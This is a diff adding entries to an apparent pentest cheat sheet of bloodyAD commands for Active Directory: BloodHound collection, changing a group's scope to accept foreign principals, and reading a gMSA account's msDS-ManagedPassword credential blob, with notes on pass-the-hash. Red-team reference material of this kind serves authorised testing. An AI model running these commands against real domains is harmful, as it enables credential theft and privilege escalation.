@@ -111,6 +111,19 @@ bloodyAD --host $dc -d $domain -u $username -p $password add dnsRecord $record_n
 ```
 bloodyAD --host $dc -d $domain -u $username -p $password set object $DN scriptPath -v $file
 ```
+### Collect Bloodhound data
+```
+bloodyAD --host $dc -d $domain -u $username -p $password get bloodhound
+```
+### Change Group Type
+somtimes you have a Global group, which can't hold cross-domain members. Sequence: - Global -> Universal -> Domain Local (groupType = -2147483644). Domain Local is the only scope that accepts Foreign Security Principals.
+```
+bloodyAD --host $dc -d $domain -u $username -p $password set object $group groupType -v -2147483644
+```
+### Get the msDS-ManagedPassword blob
+```
+bloodyAD --host $dc -d $domain -u $username -p $password get search --filter '(sAMAccountName=Pong_gMSA$)' --attr 'msDS-ManagedPassword,msDS-ManagedPasswordId,sAMAccountName' --raw
+```
 ### Notes
 - Pass `-k` to use kerberos authentication
 - You can pass a user hash instead of a password using `-p :hash` 
